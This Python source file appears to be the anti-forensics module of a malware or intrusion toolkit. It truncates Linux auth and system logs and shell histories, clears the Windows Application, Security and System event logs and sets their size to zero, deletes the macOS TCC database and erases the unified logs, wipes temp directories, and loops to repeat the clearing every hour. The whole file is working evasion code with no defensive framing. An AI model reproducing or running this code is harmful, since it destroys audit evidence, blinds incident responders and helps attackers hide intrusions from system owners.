import os
import subprocess
import threading
import time
import traceback
import sqlite3
import sys
import shutil

from pathlib import Path
from modules.logger import log_event
from modules.config import load_config

cfg = load_config().get("anti_forensics", {})
LINUX_INTERVAL = cfg.get("linux_clear_interval", 3600)
WINDOWS_CLEAR = cfg.get("windows_clear_logs", True)
MACOS_CLEAR = cfg.get("macos_clear_tcc", True)

def clear_linux_logs():
    try:
        # Wipe common log directories
        logs = ["/var/log/auth.log", "/var/log/syslog", "/var/log/kern.log"]
        for log in logs:
            if os.path.exists(log):
                open(log, "w").close()
                os.utime(log, (time.time(), time.time()))
        # Clear shell histories
        home = Path.home()
        for hist in [home / ".bash_history", home / ".zsh_history"]:
            if hist.exists():
                open(hist, "w").close()
                os.utime(hist, (time.time(), time.time()))
        log_event("anti_forensics", b"Cleared Linux logs/histories.")
    except Exception as e:
        log_event("anti_forensics", f"Error clearing Linux logs: {e}".encode())

def clear_windows_logs():
    try:
        # Clear Application, Security, System event logs
        cmds = [
            ["wevtutil", "cl", "Application"],
            ["wevtutil", "cl", "Security"],
            ["wevtutil", "cl", "System"]
        ]
        for cmd in cmds:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
        # Disable future logs by setting retention to 0
        subprocess.run(["wevtutil", "sl", "Application", "/ms:0"], timeout=15)
        subprocess.run(["wevtutil", "sl", "Security", "/ms:0"], timeout=15)
        subprocess.run(["wevtutil", "sl", "System", "/ms:0"], timeout=15)
        log_event("anti_forensics", b"Cleared and disabled Windows Event Logs.")
    except Exception as e:
        log_event("anti_forensics", f"Error clearing Windows logs: {e}".encode())

def clear_macos_tcc():
    try:
        # Remove TCC.db to wipe permissions history
        tcc_path = "/Library/Application Support/com.apple.TCC/Tcc.db"
        if os.path.exists(tcc_path):
            os.remove(tcc_path)
        # Erase unified logs (requires macOS 10.12+)
        subprocess.run(["log", "erase", "--all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
        log_event("anti_forensics", b"Cleared macOS TCC and unified logs.")
    except Exception as e:
        log_event("anti_forensics", f"Error clearing macOS logs: {e}".encode())

def wipe_all_traces():
    """Wipe all forensic traces from the system"""
    try:
        # Clear all logs
        clear_linux_logs()
        clear_windows_logs()
        clear_macos_tcc()
        
        # Clear temp files
        temp_dirs = ["/tmp", "/var/tmp", os.path.expanduser("~/tmp")]
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                for file in os.listdir(temp_dir):
                    try:
                        file_path = os.path.join(temp_dir, file)
                        if os.path.isfile(file_path):
                            os.remove(file_path)
                        elif os.path.isdir(file_path):
                            shutil.rmtree(file_path)
                    except Exception:
                        pass
        
        # Clear shell history
        shell_files = [
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history"),
            os.path.expanduser("~/.fish_history")
        ]
        
        for shell_file in shell_files:
            if os.path.exists(shell_file):
                try:
                    os.remove(shell_file)
                except Exception:
                    pass
        
        log_event("anti_forensics", "All forensic traces wiped".encode())
        
    except Exception as e:
        log_event("anti_forensics", f"Wipe traces error: {e}".encode())

def anti_forensics_loop():
    while True:
        try:
            if os.name == "nt" and WINDOWS_CLEAR:
                clear_windows_logs()
            elif sys.platform.startswith("linux"):
                clear_linux_logs()
            elif sys.platform == "darwin" and MACOS_CLEAR:
                clear_macos_tcc()
        except Exception as e:
            log_event("anti_forensics", f"Anti-forensics loop error: {e}".encode())
        time.sleep(LINUX_INTERVAL)
